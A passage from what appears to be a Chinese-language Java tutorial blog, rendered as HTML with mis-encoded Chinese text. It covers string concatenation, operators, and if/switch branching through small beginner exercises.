class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        System.out.println(<span class="hljs-number">3.7</span> + <span class="hljs-string">&quot;abc&quot;</span>);<br><br>        System.out.println(<span class="hljs-string">&quot;abc&quot;</span> + <span class="hljs-literal">true</span>);<br><br>        System.out.println(<span class="hljs-string">&#x27;ä¸­&#x27;</span> + <span class="hljs-string">&quot;abc&quot;</span> + <span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">18</span>;<br><br>        System.out.println(<span class="hljs-string">&quot;æˆ‘çš„å¹´é¾„æ˜¯ï¼š&quot;</span> + age + <span class="hljs-string">&quot;å²&quot;</span>);<br><br>        System.out.println(<span class="hljs-string">&quot;æˆ‘çš„å¹´é¾„æ˜¯ï¼š&quot;</span> + <span class="hljs-string">&quot;age&quot;</span> + <span class="hljs-string">&quot;å²&quot;</span>);<br><br>        System.out.println(<span class="hljs-number">1</span> + <span class="hljs-number">2</span> + <span class="hljs-string">&quot;abc&quot;</span> + <span class="hljs-number">2</span> + <span class="hljs-number">1</span>);<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">/*3.7abc</span><br><span class="hljs-comment">abctrue</span><br><span class="hljs-comment">ä¸­abctrue</span><br><span class="hljs-comment">æˆ‘çš„å¹´é¾„æ˜¯ï¼š18å²</span><br><span class="hljs-comment">æˆ‘çš„å¹´é¾„æ˜¯ï¼šageå²</span><br><span class="hljs-comment">3abc21*/</span><br></code></pre></td></tr></table></figure><p>å­—ç¬¦çš„<code>+</code>æ“ä½œ</p><p>å½“<code>å­—ç¬¦+å­—ç¬¦</code>æˆ–<code>å­—ç¬¦+æ•°å­—</code>æ—¶ï¼Œä¼šæŠŠå­—ç¬¦é€šè¿‡<code>ASCII</code>ç è¡¨æŸ¥è¯¢åˆ°å¯¹åº”çš„æ•°å­—å†è¿›è¡Œè®¡ç®—ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-number">1</span> + <span class="hljs-string">&#x27;a&#x27;</span> );<span class="hljs-comment">//98</span><br>System.out.println(<span class="hljs-string">&#x27;a&#x27;</span> + <span class="hljs-string">&quot;abc&quot;</span> );<span class="hljs-comment">//aabc,æœ‰å­—ç¬¦ä¸²å­˜åœ¨å°±æ˜¯æ‹¼æ¥ï¼</span><br></code></pre></td></tr></table></figure><p>è‡ªå¢è‡ªå‡è¿ç®—ç¬¦<code>++,--</code></p><ul><li>å•ç‹¬ä½¿ç”¨ï¼š<code>++</code>å’Œ<code>--</code>æ— è®ºæ˜¯æ”¾åœ¨å˜é‡å‰é¢è¿˜æ˜¯åé¢ï¼Œå•ç‹¬å†™ä¸€è¡Œç»“æœæ—¶ä¸€æ ·çš„</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>++a;<span class="hljs-comment">//æˆ–è€…a++</span><br>sout(a)<br><span class="hljs-comment">//11</span><br></code></pre></td></tr></table></figure><ul><li>å‚ä¸è®¡ç®—</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> a++;<span class="hljs-comment">//å…ˆç”¨ååŠ ï¼Œè¿™é‡Œbæ˜¯10,aæ˜¯11</span><br><br><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> ++a;<span class="hljs-comment">//å…ˆåŠ åç”¨ï¼Œè¿™é‡Œbæ˜¯11ï¼Œaæ˜¯11</span><br></code></pre></td></tr></table></figure><p>ç»ƒä¹ ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> x++;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">z</span> <span class="hljs-operator">=</span> ++x;<br><br>        System.out.println(<span class="hljs-string">&quot;x: &quot;</span> + x); <span class="hljs-comment">//12</span><br><br>        System.out.println(<span class="hljs-string">&quot;y: &quot;</span> + y); <span class="hljs-comment">//10</span><br><br>        System.out.println(<span class="hljs-string">&quot;z: &quot;</span> + z); <span class="hljs-comment">//12</span><br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>èµ‹å€¼è¿ç®—ç¬¦</p><p><img src="/img/javalearn5.png" alt="javalearn5"></p><p>æ¯”å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;<br><br>        a+=b;<span class="hljs-comment">//a+bèµ‹å€¼ç»™a</span><br><br>        System.out.println(<span class="hljs-string">&quot;a: &quot;</span> + a); <span class="hljs-comment">//3</span><br><br>        a-=b;<span class="hljs-comment">//a-bèµ‹å€¼ç»™a</span><br><br>        System.out.println(<span class="hljs-string">&quot;a: &quot;</span> + a);<span class="hljs-comment">//1</span><br><br>        a*=b;<span class="hljs-comment">//a*bèµ‹å€¼ç»™a</span><br><br>        System.out.println(<span class="hljs-string">&quot;a: &quot;</span> + a);<span class="hljs-comment">//2</span><br><br>        a/=b;<span class="hljs-comment">//a/bèµ‹å€¼ç»™a</span><br><br>        System.out.println(<span class="hljs-string">&quot;a: &quot;</span> + a);<span class="hljs-comment">//1</span><br><br>        a%=b;<span class="hljs-comment">//a%bèµ‹å€¼ç»™a</span><br><br>        System.out.println(<span class="hljs-string">&quot;a: &quot;</span> + a);<span class="hljs-comment">//1</span><br>        <br>        <span class="hljs-comment">//æ³¨æ„ï¼š+=ã€‚-=ï¼Œ*=ã€‚/=,%=åº•å±‚éƒ½éšè—ç€å¼ºåˆ¶ç±»å‹è½¬æ¢</span><br>        <span class="hljs-type">short</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-comment">//è¿™æ—¶s+=1ï¼Œä¸ç­‰åŒäºs = s +1ï¼Œè€Œæ˜¯s = (short)(s+1)</span><br>        <span class="hljs-comment">//æ³¨æ„shortä¸intç›¸åŠ æ—¶ä¼šå…ˆè½¬æˆIntï¼Œæ­¤æ—¶s + 1 åº”è¯¥æ˜¯Int,ä½†å´èµ‹å€¼ç»™äº†ä¸€ä¸ªshortç±»å‹çš„å˜é‡ï¼Ÿ</span><br>        <span class="hljs-comment">//</span><br>        <br>    &#125;<br>&#125;<br><br><br><br></code></pre></td></tr></table></figure><p>å…³ç³»è¿ç®—ç¬¦</p><p><img src="/img/javalearn6.png" alt="javalearn6"></p><blockquote><p>æ³¨æ„ï¼šå…³ç³»è¿ç®—ç¬¦çš„ç»“æœéƒ½æ˜¯booleanç±»å‹ï¼Œå³è¦ä¹ˆtrueè¦ä¹ˆfalseã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><br>        System.out.println(a == b);<span class="hljs-comment">//false</span><br><br>        System.out.println(a == c);<span class="hljs-comment">//true</span><br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»ƒä¹ ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;è¯·è¾“å…¥å¯¹æ–¹åˆ†æ•°(0-10)ï¼š&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        System.out.println(<span class="hljs-string">&quot;è¯·è¾“å…¥ä½ çš„åˆ†æ•°(0-10)ï¼š&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num2</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> num2 &gt;= num1;<br><br>        System.out.println(a);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é€»è¾‘è¿ç®—ç¬¦</p><p><img src="/img/javalearn7.png" alt="javalearn7"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        System.out.println(<span class="hljs-literal">true</span> &amp; <span class="hljs-literal">true</span>);<br><br>        System.out.println(<span class="hljs-literal">true</span> &amp; <span class="hljs-literal">false</span>);<br><br>        System.out.println(<span class="hljs-literal">true</span> | <span class="hljs-literal">false</span>);<br><br>        System.out.println(<span class="hljs-literal">false</span> | <span class="hljs-literal">false</span>);<br><br>        System.out.println(<span class="hljs-literal">false</span> ^ <span class="hljs-literal">true</span>);<br><br>        System.out.println(!<span class="hljs-literal">false</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>çŸ­è·¯é€»è¾‘è¿ç®—ç¬¦</p><p><img src="/img/jajvalearn8.png" alt="jajvalearn8"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">```<br><br>```java<br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> bianliang1 &#123;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args)&#123;<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">true</span> &amp;&amp; <span class="hljs-keyword">true</span>);<br><br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">true</span> &amp;&amp; <span class="hljs-keyword">false</span>);<br><br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">true</span> || <span class="hljs-keyword">false</span>);<br><br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">false</span> || <span class="hljs-keyword">false</span>);<br><br>        <span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;<br><br>        <span class="hljs-type">int</span> b = <span class="hljs-number">20</span>;<br><br>        <span class="hljs-type">boolean</span> result = ++a &lt; <span class="hljs-number">5</span> &amp;&amp; ++b &lt; <span class="hljs-number">5</span>;<br><br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(a);<br><br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(b);<br><br>        <span class="hljs-type">boolean</span> result2 = ++a &lt; <span class="hljs-number">5</span> &amp; ++b &lt; <span class="hljs-number">5</span>;<br><br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(a);<br><br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(b);<br>    &#125;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">true</span><br><span class="hljs-comment">false</span><br><span class="hljs-comment">true</span><br><span class="hljs-comment">false</span><br><span class="hljs-comment">11</span><br><span class="hljs-comment">20</span><br><span class="hljs-comment">12</span><br><span class="hljs-comment">21</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>ç»ƒä¹ ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;è¯·è¾“å…¥ä¸€ä¸ªæ•°num1ï¼š&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        System.out.println(<span class="hljs-string">&quot;è¯·è¾“å…¥ä¸€ä¸ªæ•°num2ï¼š&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num2</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">result1</span> <span class="hljs-operator">=</span> num1 == <span class="hljs-number">6</span> || num2 == <span class="hljs-number">6</span>;<br><br>        System.out.println(result1);<br><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">result2</span> <span class="hljs-operator">=</span> (num1 + num2) % <span class="hljs-number">6</span> == <span class="hljs-number">0</span>;<br><br>        System.out.println(result2);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="åˆ†æ”¯ç»“æ„if"><a href="#åˆ†æ”¯ç»“æ„if" class="headerlink" title="åˆ†æ”¯ç»“æ„if:"></a>åˆ†æ”¯ç»“æ„<code>if</code>:</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;è¯·è¾“å…¥ä½ å£è¢‹é‡Œçš„é’±ï¼š&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">money</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-keyword">if</span> (money &gt; <span class="hljs-number">100</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;111&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;222&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//ç»ƒä¹ </span><br><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;è¯·è¾“å…¥ä½ çš„å·ç ï¼š&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">number</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-keyword">if</span> (number &lt;=<span class="hljs-number">100</span> &amp;&amp; number &gt;=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">if</span> (number % <span class="hljs-number">2</span>==<span class="hljs-number">1</span>) &#123;<br>                System.out.println(<span class="hljs-string">&quot;è¯·ååœ¨å·¦è¾¹&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;è¯·ååœ¨å³è¾¹&quot;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;ä¸ç¬¦åˆè§„å®šï¼&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">//ç»ƒä¹ </span><br><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;è¯·è¾“å…¥å°æ˜çš„æˆç»©ï¼š&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">number</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-keyword">if</span> (number &lt;=<span class="hljs-number">100</span> &amp;&amp; number &gt;=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">if</span> (number &gt;= <span class="hljs-number">95</span>) &#123;<br>                System.out.println(<span class="hljs-string">&quot;ä¸€ç­‰å¥–&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (number &lt;= <span class="hljs-number">94</span> &amp;&amp; number &gt;= <span class="hljs-number">90</span>)&#123;<br>                System.out.println(<span class="hljs-string">&quot;äºŒç­‰å¥–&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (number &lt;= <span class="hljs-number">89</span> &amp;&amp; number &gt;=<span class="hljs-number">85</span>)&#123;<br>                System.out.println(<span class="hljs-string">&quot;ä¸‰ç­‰å¥–&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;æ— å¥–&quot;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;è¯·è¾“å…¥åˆç†çš„æˆç»©ï¼&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="åˆ†æ”¯ç»“æ„switch"><a href="#åˆ†æ”¯ç»“æ„switch" class="headerlink" title="åˆ†æ”¯ç»“æ„switch"></a>åˆ†æ”¯ç»“æ„<code>switch</code></h4><p><img src="/img/javalearn29.png" alt="javalearn29"></p><p><img src="/img/javalearn30.png" alt="javalearn30"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;è¯·è¾“å…¥é¢æ¡ç§ç±»ï¼š&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">noodles</span> <span class="hljs-operator">=</span> sc.next();<br><br>        <span class="hljs-keyword">switch</span> (noodles)&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;çƒ­å¹²é¢&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;reganmian&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;å…°å·æ‹‰é¢&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;lanzhoulamian&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;ç‚¸é…±é¢&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;zhajiangmian&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                System.out.println(<span class="hljs-string">&quot;fangbianmian&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/javalearn22.png" alt="javalearn22"></p><h4 id="defaultçš„ä½ç½®å’Œçœç•¥"><a href="#defaultçš„ä½ç½®å’Œçœç•¥" class="headerlink" title="defaultçš„ä½ç½®å’Œçœç•¥"></a>defaultçš„ä½ç½®å’Œçœç•¥</h4><ul><li>defaultå¯ä»¥å†™åœ¨ä»»æ„ä½ç½®ï¼Œä¹Ÿå¯ä»¥çœç•¥ä¸å†™</li></ul><h4 id="caseç©¿é€"><a href="#caseç©¿é€" class="headerlink" 